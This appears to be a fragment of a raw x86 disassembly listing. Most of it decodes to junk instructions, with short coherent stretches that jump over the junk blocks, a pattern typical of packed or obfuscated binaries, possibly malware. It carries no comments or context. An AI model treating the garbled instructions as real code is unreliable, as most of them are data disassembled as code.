  40f0bc:	scas   eax,DWORD PTR es:[edi]
  40f0bd:	je     0x40f0d9
  40f0bf:	jl     0x40f09c
  40f0c1:	inc    ebx
  40f0c2:	push   0xffffff8e
  40f0c4:	(bad)  
  40f0c5:	jne    0x40f069
  40f0c7:	aad    0x5e
  40f0c9:	rol    dl,cl
  40f0cb:	adc    al,0x37
  40f0cd:	int3   
  40f0ce:	test   eax,0xbaf32db8
  40f0d3:	shr    dh,cl
  40f0d5:	xchg   ebx,eax
  40f0d6:	xchg   edi,eax
  40f0d7:	nop
  40f0d8:	ficomp WORD PTR [edx]
  40f0da:	fcomp  st(2)
  40f0dc:	sub    eax,DWORD PTR [ebx]
  40f0de:	add    al,0x86
  40f0e0:	jl     0x40f0ee
  40f0e2:	add    eax,0x359c5b05
  40f0e7:	cmp    al,0x42
  40f0e9:	cmp    eax,DWORD PTR [esi+0x30]
  40f0ec:	mov    bh,0x25
  40f0ee:	push   0x12ef05ec
  40f0f3:	ins    BYTE PTR es:[edi],dx
  40f0f4:	jae    0x40f162
  40f0f6:	mov    dh,0x45
  40f0f8:	and    al,0x27
  40f0fa:	ret    
  40f0fb:	xor    eax,0xc8faa8e9
  40f100:	cmp    DWORD PTR [eax+0xe91f4d0],esi
  40f106:	pop    edi
  40f107:	cmp    al,0x0
  40f109:	xchg   esi,eax
  40f10a:	adc    ebx,DWORD PTR [ebp-0x5a]
  40f10d:	out    dx,eax
  40f10e:	adc    esp,0x55967572
  40f114:	push   ebp
  40f115:	outs   dx,BYTE PTR ds:[esi]
  40f116:	out    dx,eax
  40f117:	retf   0x980d
  40f11a:	mov    dh,0xe
  40f11c:	xchg   bl,ah
  40f11e:	aam    0xd3
  40f120:	out    dx,eax
  40f121:	xchg   ebx,eax
  40f122:	(bad)  [esi+ebp*1-0x57153a0d]
  40f129:	ins    DWORD PTR es:[edi],dx
  40f12a:	dec    BYTE PTR [ebx+eax*2-0x2d]
  40f12e:	pusha  
  40f12f:	(bad)  
  40f130:	(bad)  
  40f132:	scas   al,BYTE PTR es:[edi]
  40f133:	cld    
  40f134:	pop    edi
  40f135:	push   edi
  40f136:	addr16 in al,dx
  40f138:	push   ecx
  40f139:	or     ecx,DWORD PTR [eax+0x6487b126]
  40f13f:	les    eax,FWORD PTR [ecx]
  40f141:	and    ah,dl
  40f143:	xchg   ebp,eax
  40f144:	out    0x1,eax
  40f146:	push   ss
  40f147:	sbb    DWORD PTR [esp+ebx*4+0x4c],eax
  40f14b:	inc    edx
  40f14c:	mov    ebp,0x5c18e851
  40f151:	jmp    0x40f1a1
  40f153:	je     0x40f2d1
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [eax-0x6d],edx
  40f16f:	ins    DWORD PTR es:[edi],dx
  40f170:	fsub   QWORD PTR [ebx-0x3c8f8f56]
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f15a
  40f17a:	into   
  40f17b:	mov    ds:0xc0e0439e,al
  40f180:	dec    esi
  40f181:	data16 and ch,BYTE PTR [eax-0x5d]
  40f185:	test   al,0x59
  40f187:	inc    edi
  40f188:	mov    cs,ebx
  40f18a:	mov    ebx,0x8c0054fd
  40f18f:	xchg   esi,eax
  40f190:	repz mov dh,0xf0
  40f193:	cwde   
  40f194:	cmp    DWORD PTR [eax+0x2bf66e33],esp
  40f19a:	dec    edx
  40f19b:	js     0x40f15f
  40f19d:	xor    bl,BYTE PTR [edx]
  40f19f:	pop    esp
  40f1a0:	icebp  
  40f1a1:	sub    BYTE PTR [edi+edi*4],al
  40f1a4:	and    eax,0xd9b2f778
  40f1a9:	gs popf 
  40f1ab:	lods   al,BYTE PTR ds:[esi]
  40f1ac:	push   es
  40f1ad:	pop    ebp
  40f1ae:	scas   eax,DWORD PTR es:[edi]
  40f1af:	cdq    
  40f1b0:	call   0x876f2e45
  40f1b5:	test   dl,bh
  40f1b7:	and    DWORD PTR [edx+0x386d77b],esi
  40f1bd:	add    eax,0xb33b87f9
  40f1c2:	mov    esp,0x8f49fbc5
  40f1c7:	fxch   st(7)
  40f1c9:	pop    ss
  40f1ca:	mov    bh,BYTE PTR [ebp-0x25]
  40f1cd:	cmp    bl,BYTE PTR [edx]
  40f1cf:	xchg   esp,eax
  40f1d0:	jmp    0x1b6fda89
  40f1d5:	push   0x36
  40f1d7:	shr    DWORD PTR [ebx],0xe5
  40f1da:	cmp    DWORD PTR [edx-0x39],eax
  40f1dd:	xor    edx,DWORD PTR [edi-0x19c8418b]
  40f1e3:	leave  
  40f1e4:	jge    0x40f1ed
  40f1e6:	fimul  DWORD PTR [edx+0x15]
  40f1e9:	cmp    ebx,DWORD PTR [ecx-0x710b3f17]
  40f1ef:	mov    esi,0x19769be2
  40f1f4:	aam    0x93
  40f1f6:	sahf   
  40f1f7:	(bad)  
  40f1f9:	imul   DWORD PTR [edi+0x4d222abd]
  40f1ff:	xor    eax,0xb486be44
  40f204:	aas    
  40f205:	test   BYTE PTR [edi],dh
  40f207:	je     0x40f1a9
  40f209:	jno    0x40f281
  40f20b:	mov    eax,0xd8f590b7
  40f210:	dec    esp
  40f211:	outs   dx,DWORD PTR ds:[esi]
  40f212:	and    al,0xd9
  40f214:	aad    0x9c
  40f216:	ret    0x713a
  40f219:	pop    esi
  40f21a:	xchg   ecx,eax
  40f21b:	stos   BYTE PTR es:[edi],al
  40f21c:	jmp    0x4eb8:0xc8572aca
  40f223:	and    al,0x26
  40f225:	xor    BYTE PTR [ebx+ebx*2-0x42],dh
  40f229:	xchg   ebx,eax
  40f22a:	mov    ds:0xeb514349,eax
  40f22f:	cmp    dl,BYTE PTR [esi]
  40f231:	dec    esi
  40f232:	inc    esp
  40f233:	mov    ecx,DWORD PTR [edi+ebp*4+0x6bbf2d2f]
  40f23a:	cmp    al,0xfe
  40f23c:	ds test al,0xc5
  40f23f:	adc    eax,0xe960352b
  40f244:	cmc    
  40f245:	mov    edi,ebp
  40f247:	jp     0x40f1fc
  40f249:	jp     0x40f270
  40f24b:	dec    eax
  40f24c:	fild   DWORD PTR [edi-0x5976af6d]
  40f252:	add    ebx,DWORD PTR [edi-0x51]
  40f255:	clc    
  40f256:	ret    
  40f257:	sub    dl,BYTE PTR [edx-0x2e]
  40f25a:	test   dl,dl
  40f25c:	test   eax,0xe18db2b4
  40f261:	sbb    al,0x5d
  40f263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f264:	cmp    eax,0xdacd750d
  40f269:	dec    esi
  40f26a:	or     edx,DWORD PTR [esi]
  40f26c:	aaa    
  40f26d:	into   
  40f26e:	inc    ecx
  40f26f:	cld    
  40f270:	adc    eax,0x2552503e
  40f275:	out    0x74,al
  40f277:	sti    
  40f278:	int    0xf7
  40f27a:	fisubr WORD PTR [esi]
  40f27c:	inc    ebx
  40f27d:	and    eax,0x5326c441
  40f282:	jae    0x40f216
  40f284:	mov    ebx,0xc7daec07
  40f289:	fiadd  DWORD PTR [eax]
  40f28b:	popf   
  40f28c:	outs   dx,DWORD PTR ds:[esi]
  40f28d:	dec    edx
  40f28e:	add    al,0x89
  40f290:	scas   al,BYTE PTR es:[edi]
  40f291:	popa   
  40f292:	inc    ebx
  40f293:	fwait
  40f294:	push   ebp
  40f295:	sbb    DWORD PTR [esi+0x4e2efd70],eax
  40f29b:	(bad)  
  40f29c:	cld    
  40f29d:	sbb    bl,BYTE PTR [eax]
  40f29f:	idiv   BYTE PTR [edi*2+0x53d7e62d]
  40f2a6:	js     0x40f30d
  40f2a8:	mov    eax,0xf67f6053
  40f2ad:	jno    0x40f2fd
  40f2af:	pop    ebp
  40f2b0:	hlt    
  40f2b1:	push   ds
  40f2b2:	xor    DWORD PTR ds:0x41ac2355,ebx
  40f2b8:	pop    esp
  40f2b9:	adc    edi,DWORD PTR [edx-0x22]
  40f2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2bd:	(bad)  
  40f2be:	lods   eax,DWORD PTR ds:[esi]
  40f2bf:	lahf   
  40f2c0:	push   es
  40f2c1:	add    DWORD PTR [esi],edi
  40f2c3:	sbb    ebx,esp
  40f2c5:	stc    
  40f2c6:	mov    DWORD PTR [eax],0x60341e89
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	rcl    BYTE PTR [eax-0x28],1
  40f2f9:	outs   dx,BYTE PTR ds:[esi]
  40f2fa:	sahf   
  40f2fb:	jbe    0x40f2a6
  40f2fd:	jo     0x40f36f
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f2aa
  40f304:	ss push eax
  40f306:	pop    edx
  40f307:	add    eax,0x2ae3253e
  40f30c:	sbb    BYTE PTR [ebx],0x90
  40f30f:	ffree  st(2)
  40f311:	rol    ch,0x3c
  40f314:	mov    edx,0xf953a7af
  40f319:	bound  edx,QWORD PTR [esi+0x6a]
  40f31c:	rol    DWORD PTR [edi-0x15],0x25
  40f320:	xchg   edi,eax
  40f321:	add    BYTE PTR [edx+0x3f],ah
  40f324:	lock sbb edx,edi
  40f327:	or     cl,cl
  40f329:	pop    ebx
  40f32a:	pop    edi
  40f32b:	xor    BYTE PTR [esi],ch
  40f32d:	lods   eax,DWORD PTR ds:[esi]
  40f32e:	mul    DWORD PTR [ecx+0x1fd62eda]
  40f334:	mov    esp,0xf262332e
  40f339:	fcomp  QWORD PTR [ecx]
  40f33b:	sub    dl,BYTE PTR [ecx-0x10]
  40f33e:	sub    bl,BYTE PTR [ebx-0x6725ffeb]
  40f344:	in     al,dx
  40f345:	ss test al,0x95
  40f348:	fs inc ecx
  40f34a:	rcr    BYTE PTR [ebp+0x2e],cl
  40f34d:	sub    BYTE PTR [bp+di+0x13],bh
  40f351:	xchg   edx,eax
  40f352:	jp     0x40f2f5
  40f354:	inc    edi
  40f355:	mov    ebx,0xc5c4db0f
  40f35a:	xchg   dh,ch
  40f35c:	mov    bh,0x5d
  40f35e:	repnz test eax,0xfd724473
  40f364:	inc    edi
  40f365:	and    ah,BYTE PTR [ebp+0x3]
  40f368:	mov    bh,BYTE PTR [edx+ecx*2+0x41ca162d]
  40f36f:	push   eax
  40f370:	push   eax
  40f371:	sub    ch,BYTE PTR [ebx+0x42f38c57]
  40f377:	and    eax,0xf4085ce6
  40f37c:	inc    ebp
  40f37d:	shl    BYTE PTR [edx+0x1e],cl
  40f380:	int3   
  40f381:	and    ch,al
  40f383:	rol    BYTE PTR [edi],cl
  40f385:	fs cmp eax,0x47894b06
  40f38b:	fisttp WORD PTR [ebp+0x5e]
  40f38e:	mov    DWORD PTR [esi+0x1a],esp
  40f391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f392:	mov    dh,0x56
  40f394:	adc    al,0x3a
  40f396:	popa   
  40f397:	dec    ebx
  40f398:	xchg   esp,eax
  40f399:	adc    DWORD PTR [edi+0x3159e7e2],ecx
  40f39f:	pop    edi
  40f3a0:	cs pop eax
  40f3a2:	and    al,0x70
  40f3a4:	or     DWORD PTR ds:[ecx+0x2c],0xffffffb1
  40f3a9:	out    0x4f,eax
  40f3ab:	scas   al,BYTE PTR es:[edi]
  40f3ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3ad:	repnz mov al,0x3f
  40f3b0:	sbb    al,0xdf
  40f3b2:	xchg   esp,eax
  40f3b3:	pop    edi
  40f3b4:	iret   
  40f3b5:	jno    0x40f433
  40f3b7:	jmp    FWORD PTR gs:[esp+ecx*8-0x15099c81]
  40f3bf:	inc    ebx
  40f3c0:	lods   al,BYTE PTR ds:[esi]
  40f3c1:	push   ss
  40f3c2:	and    BYTE PTR [eax-0x15],0xc5
  40f3c6:	call   0xa1b4:0x368c1b3e
  40f3cd:	stos   BYTE PTR es:[edi],al
  40f3ce:	stos   BYTE PTR es:[edi],al
  40f3cf:	imul   dl
  40f3d1:	iret   
  40f3d2:	pop    ds
  40f3d3:	adc    eax,0xa254dd1f
  40f3d8:	adc    DWORD PTR [edx],eax
  40f3da:	jae    0x40f381
  40f3dc:	(bad)  
  40f3de:	shr    BYTE PTR [ebp-0x74],cl
  40f3e1:	rcr    BYTE PTR [esi],cl
  40f3e3:	imul   DWORD PTR [ebp-0x54874c12]
  40f3e9:	xchg   edi,eax
  40f3ea:	enter  0xf46a,0xac
  40f3ee:	loop   0x40f430
  40f3f0:	in     eax,dx
  40f3f1:	clc    
  40f3f2:	mov    bl,0x29
  40f3f4:	sbb    edx,edi
  40f3f6:	sub    ch,dh
  40f3f8:	imul   ecx,ecx,0x7b
  40f3fb:	outs   dx,BYTE PTR ds:[esi]
  40f3fc:	fsub   st(6),st
  40f3fe:	mov    eax,ds:0xddbbe006
  40f403:	add    dh,BYTE PTR [eax-0x2ec5f71f]
  40f409:	pop    ecx
  40f40a:	sub    dh,BYTE PTR ds:0xc81c1b5c
  40f410:	lahf   
  40f411:	loop   0x40f3e2
  40f413:	mov    esi,0x7172a98
  40f418:	push   0xffffff97
  40f41a:	pop    edx
  40f41b:	lock sbb edx,DWORD PTR [edx+eax*4]
  40f41f:	scas   al,BYTE PTR es:[edi]
  40f420:	push   ebx
  40f421:	out    0x9b,al
  40f423:	cmc    
  40f424:	and    DWORD PTR [ebx],esp
  40f426:	aad    0x59
  40f428:	jp     0x40f45d
  40f42a:	sbb    ebp,ebp
  40f42c:	cmp    eax,0x89e10f79
  40f431:	dec    eax
  40f432:	jo     0x40f3cf
  40f434:	mov    dh,0xc8
  40f436:	or     bl,BYTE PTR [esi+0x23]
  40f439:	pop    ecx
  40f43a:	push   edi
  40f43b:	push   ebx
  40f43c:	test   BYTE PTR [edx+0x5a],0xc5
  40f440:	(bad)  [ebx+eax*2]
  40f443:	jnp    0x40f4b7
  40f445:	xchg   DWORD PTR ds:0x3989202a,edx
  40f44b:	dec    ebp
  40f44c:	cmp    al,0xf
  40f44e:	xor    eax,0xf8458b11
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	(bad)  
  40f465:	outs   dx,BYTE PTR ds:[esi]
  40f466:	cmp    ah,BYTE PTR [eax+0x7070b739]
  40f46c:	ret    
  40f46d:	jg     0x40f4df
  40f46f:	jo     0x40f3f2
  40f471:	mov    esp,0x1f52c62c
  40f476:	loope  0x40f487
  40f478:	aam    0xbc
  40f47a:	mov    edi,0xf15a4967
  40f47f:	sbb    DWORD PTR [eax+0x5210b4a7],esp
  40f485:	xchg   DWORD PTR [edx-0x5159cfc8],ecx
  40f48b:	ins    DWORD PTR es:[edi],dx
  40f48c:	stc    
  40f48d:	adc    edx,ebx
  40f48f:	mov    bh,0x92
  40f491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f492:	jne    0x40f4bc
  40f494:	out    dx,eax
  40f495:	test   eax,0xe8ab3306
  40f49a:	out    dx,eax
  40f49b:	push   0xd9ee0a05
  40f4a0:	dec    eax
  40f4a1:	ins    DWORD PTR es:[edi],dx
  40f4a2:	inc    ebp
  40f4a3:	xor    ecx,eax
  40f4a5:	jb     0x40f495
  40f4a7:	mov    DWORD PTR [ecx],edi
  40f4a9:	push   ebx
  40f4aa:	fnstenv [ebx]
  40f4ac:	call   0xb9f78f58
  40f4b1:	fmul   QWORD PTR [esp+ecx*2]
  40f4b4:	mov    eax,ds:0x1d765ec
  40f4b9:	xlat   BYTE PTR ds:[ebx]
  40f4ba:	or     DWORD PTR [ebx],edi
  40f4bc:	push   0x68
  40f4be:	or     edi,eax
  40f4c0:	push   cs
  40f4c1:	adc    ebp,edx
  40f4c3:	(bad)
  40f4c8:	arpl   WORD PTR ds:0x9a227b9a,sp
  40f4ce:	mov    esp,0xfe7b7672
  40f4d3:	push   ebp
  40f4d4:	jecxz  0x40f4ec
  40f4d6:	fs std 
  40f4d8:	rol    BYTE PTR es:[ecx+ecx*4],0xce
  40f4dd:	fdivr  QWORD PTR [ecx+0x217b9aab]
  40f4e3:	call   0xcfb4fa37
  40f4e8:	add    BYTE PTR [edi+0x277bf34],al
  40f4ee:	pop    ebx
  40f4ef:	lods   eax,DWORD PTR ds:[esi]
  40f4f0:	fs inc eax
  40f4f2:	ficom  WORD PTR [eax+0x5]
  40f4f5:	xchg   DWORD PTR [edx],ecx
  40f4f7:	lock mov dh,0x17
  40f4fa:	addr16 cmp al,0xa
  40f4fd:	mov    dl,0x99
  40f4ff:	bound  edx,QWORD PTR [ebx-0x72332ba6]
  40f505:	call   0xd85ab1e2
  40f50a:	jno    0x40f4ec
  40f50c:	(bad)  
  40f50e:	jb     0x40f517
  40f510:	in     eax,dx
  40f511:	dec    esp
  40f512:	jne    0x40f4ec
  40f514:	adc    al,0xa3
  40f516:	jg     0x40f518
  40f518:	cmp    DWORD PTR [ebx-0x32715d0c],ebp
  40f51e:	call   0x20057f15
  40f523:	shr    edi,cl
  40f525:	scas   al,BYTE PTR es:[edi]
  40f526:	sbb    ebp,DWORD PTR [ebx]
  40f528:	or     BYTE PTR [esi],0x89
  40f52b:	push   eax
  40f52c:	sub    ebx,DWORD PTR [ecx]
  40f52e:	fst    QWORD PTR [ecx]
  40f530:	retf   
  40f531:	(bad)
  40f534:	std    
  40f535:	out    0x46,al
  40f537:	(bad)  
  40f538:	pop    esp
  40f539:	jno    0x40f58c
  40f53b:	or     bl,BYTE PTR [ecx]
  40f53d:	cld    
  40f53e:	push   ds
  40f53f:	clc    
  40f540:	pusha  
  40f541:	or     eax,0xb2657481
  40f546:	or     edx,DWORD PTR [eax]
  40f548:	jle    0x40f5a6
  40f54a:	aam    0x70
  40f54c:	pop    esi
  40f54d:	xchg   edx,eax
  40f54e:	sub    eax,0x5201386f
  40f553:	stos   BYTE PTR es:[edi],al
  40f554:	xchg   edi,eax
  40f555:	daa    
  40f556:	sub    al,0x18
  40f558:	jg     0x40f5b2
  40f55a:	fiadd  WORD PTR [esi]
  40f55c:	push   cs
  40f55d:	push   cs
  40f55e:	fldcw  WORD PTR ds:0xe000e54a
  40f564:	mov    al,0x65
  40f566:	mov    ebp,0x17f4d485
  40f56b:	aad    0xf8
  40f56d:	sbb    edi,DWORD PTR [edi+ecx*2-0x6e]
  40f571:	cmp    al,BYTE PTR [esp+edx*1-0x7]
  40f575:	xor    DWORD PTR cs:[ecx+eax*2+0x296eb65],eax
  40f57d:	sub    al,0x28
  40f57f:	xor    edi,DWORD PTR [ecx+0x5b]
  40f582:	cmp    eax,0xf82b00f1
  40f587:	sub    DWORD PTR [eax],0xffffff9f
  40f58a:	cwde   
  40f58b:	dec    ebp
  40f58c:	push   ds
  40f58d:	mov    ebp,0x77a597d5
  40f592:	arpl   si,cx
  40f594:	push   ds
  40f595:	pop    ebx
  40f596:	fcmovnb st,st(6)
  40f598:	scas   eax,DWORD PTR es:[edi]
  40f599:	inc    ebp
  40f59a:	and    dl,dl
  40f59c:	add    cl,BYTE PTR [ecx]
  40f59e:	jecxz  0x40f574
  40f5a0:	add    al,0x59
  40f5a2:	cmp    eax,esp
  40f5a4:	and    DWORD PTR [edi],ecx
  40f5a6:	mov    eax,0xd9958963
  40f5ab:	jbe    0x40f593
  40f5ad:	cli    
  40f5ae:	popf   
  40f5af:	into   
  40f5b0:	data16 mov ?,WORD PTR [ecx+0x46]
  40f5b4:	leave  
  40f5b5:	and    eax,0x8c01b55d
  40f5ba:	xor    bh,cl
  40f5bc:	dec    BYTE PTR [ebx+0x3c408b00]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	enter  0x3652,0xb2
  40f607:	mov    WORD PTR [esi+0x7fc37070],?
  40f60d:	jo     0x40f67f
  40f60f:	mov    cs,esi
  40f611:	scas   eax,DWORD PTR es:[edi]
  40f612:	lods   eax,DWORD PTR ds:[esi]
  40f613:	cdq    
  40f614:	push   ss
  40f615:	lea    eax,[esi+0x6d0ac02b]
  40f61b:	ss ret 0x5a82
  40f61f:	pushf  
  40f620:	mov    bl,0xcb
  40f622:	add    BYTE PTR [esi+0x52],al
  40f625:	dec    ebx
  40f626:	ins    BYTE PTR es:[edi],dx
  40f627:	fisttp QWORD PTR [edi-0x14]
  40f62a:	adc    DWORD PTR [esi],0x29af5fd4
  40f630:	es push ds
  40f632:	pop    ds
  40f633:	jmp    0x706ada6
  40f638:	cli    
  40f639:	js     0x40f5df
  40f63b:	xchg   ebp,eax
  40f63c:	test   BYTE PTR [eax-0x5e],dl
  40f63f:	into   
  40f640:	mov    edi,0xe8d52b52
  40f645:	pop    ds
  40f646:	es cmp eax,0x8e0885fa
  40f64c:	mov    BYTE PTR [eax-0x80],cl
  40f64f:	ret    0xfbed
  40f652:	xor    eax,0x8e610480
  40f657:	cmp    DWORD PTR [eax-0xf],0x5d
  40f65b:	loop   0x40f630
  40f65d:	lahf   
  40f65e:	cmove  eax,DWORD PTR [ebx+0x7a4158cb]
  40f665:	(bad)  
  40f666:	cwde   
  40f667:	loop   0x40f6b2
  40f669:	push   ss
  40f66a:	inc    edx
  40f66b:	fucomip st,st(2)
  40f66d:	jge    0x40f6b4
  40f66f:	in     al,dx
  40f670:	pop    ecx
  40f671:	push   0xffffffed
  40f673:	and    eax,DWORD PTR [ebx]
  40f675:	adc    eax,0xd9983bd3
  40f67a:	out    0xc6,al
  40f67c:	in     al,0xb2
  40f67e:	ror    DWORD PTR [ebp+0x5457491f],cl
  40f684:	xchg   ecx,eax
  40f685:	ret    0xa19b
  40f688:	add    DWORD PTR [edi+ebx*8],edx
  40f68b:	lods   eax,DWORD PTR ds:[esi]
  40f68c:	jae    0x40f66f
  40f68e:	ret    0xdf96
  40f691:	inc    eax
  40f692:	mov    BYTE PTR [esi-0x59],dl
  40f695:	mov    ebx,0x5590f3d
  40f69a:	les    ecx,FWORD PTR [edx]
  40f69c:	jbe    0x40f6e9
  40f69e:	adc    al,0x6e
  40f6a0:	cmp    ebx,ebx
  40f6a2:	lods   eax,DWORD PTR ds:[esi]
  40f6a3:	mov    edx,0xcae831b4
  40f6a8:	mov    cl,0xd8
  40f6aa:	mov    eax,0x9ee437bc
  40f6af:	ins    DWORD PTR es:[edi],dx
  40f6b0:	nop
  40f6b1:	std    
  40f6b2:	dec    ebp
  40f6b3:	mov    eax,0x547b86bc
  40f6b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6b9:	jne    0x40f720
  40f6bb:	fild   DWORD PTR [eax-0x24]
  40f6be:	mov    edi,0x1f99e2d5
  40f6c3:	inc    ecx
  40f6c4:	push   cs
  40f6c5:	(bad)  
  40f6c6:	(bad)  
  40f6c8:	xor    BYTE PTR [ebp+ebx*4+0x1d],ch
  40f6cc:	push   esi
  40f6cd:	clc    
  40f6ce:	call   0x8d05:0x21b4c081
  40f6d5:	call   0xfa7b:0x9ea47b7e
  40f6dc:	out    dx,al
  40f6dd:	cmp    eax,DWORD PTR [ecx-0xb120904]
  40f6e3:	xchg   esi,eax
  40f6e4:	in     al,dx
  40f6e5:	mov    eax,ds:0x1ac31ccd
  40f6ea:	mov    esi,0x13cd0564
  40f6ef:	inc    edx
  40f6f0:	mov    eax,0x9bc292be
  40f6f5:	in     al,dx
  40f6f6:	inc    ecx
  40f6f7:	pop    edi
  40f6f8:	jmp    0x40f6a5
  40f6fa:	shl    BYTE PTR [edx-0x47],cl
  40f6fd:	mov    ds:0xc00e92da,al
  40f702:	inc    ebx
  40f703:	inc    ebx
  40f704:	push   esp
  40f705:	inc    ecx
  40f706:	jmp    0x40f76c
  40f708:	repz sub dl,BYTE PTR [esi-0x4b70db5]
  40f70f:	cli    
  40f710:	cli    
  40f711:	out    0x66,eax
  40f713:	push   ebp
  40f714:	fucomi st,st(3)
  40f716:	add    ebp,DWORD PTR [edx+0x72]
  40f719:	mov    cl,0x3e
  40f71b:	sbb    al,0x5c
  40f71d:	sti    
  40f71e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f71f:	mov    cl,0x33
  40f721:	loope  0x40f79a
  40f723:	(bad)  
  40f724:	dec    esi
  40f725:	sbb    eax,0x8b831ffa
  40f72a:	idiv   BYTE PTR [eax]
  40f72c:	jg     0x40f760
  40f72e:	fstp   QWORD PTR [esi]
  40f730:	enter  0x1874,0x42
  40f734:	lea    esi,[ebx+eax*4]
  40f737:	or     edx,DWORD PTR [eax+0x12d97a86]
  40f73d:	mov    ecx,DWORD PTR [eax+edi*4]
  40f740:	mov    dh,0xf
  40f742:	jmp    0x382f:0xf1ef8943
  40f749:	iret   
  40f74a:	xchg   edi,eax
  40f74b:	out    dx,eax
  40f74c:	push   ebp
  40f74d:	cmp    eax,0x1d9ca4b1
  40f752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f753:	lods   al,BYTE PTR ds:[esi]
  40f754:	mov    ?,WORD PTR [ecx-0x2d4e100a]
  40f75a:	jns    0x40f703
  40f75c:	mov    eax,DWORD PTR [ebp-0x8]
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0xab5746f3
  40f7e3:	dec    eax
  40f7e4:	xchg   BYTE PTR [edi-0x4b],bl
  40f7e7:	jo     0x40f859
  40f7e9:	mov    ds:0x4c70707d,eax
  40f7ee:	(bad)  
  40f7ef:	je     0x40f854
  40f7f1:	adc    ch,dh
  40f7f3:	sahf   
  40f7f4:	loope  0x40f848
  40f7f6:	dec    eax
  40f7f7:	mov    al,ds:0x74522633
  40f7fc:	(bad)  
  40f7fd:	call   0x9a4608f1
  40f802:	loope  0x40f859
  40f804:	imul   edi,DWORD PTR [edx+0x71],0x7e
  40f808:	push   cs
  40f809:	jno    0x40f7ec
  40f80b:	push   ss
  40f80c:	call   0xd5384a14
  40f811:	push   es
  40f812:	pushf  
  40f813:	adc    al,0x9a
  40f815:	cwde   
  40f816:	ins    DWORD PTR es:[edi],dx
  40f817:	push   edx
  40f818:	scas   al,BYTE PTR es:[edi]
  40f819:	add    dh,ch
  40f81b:	jl     0x40f86f
  40f81d:	inc    edx
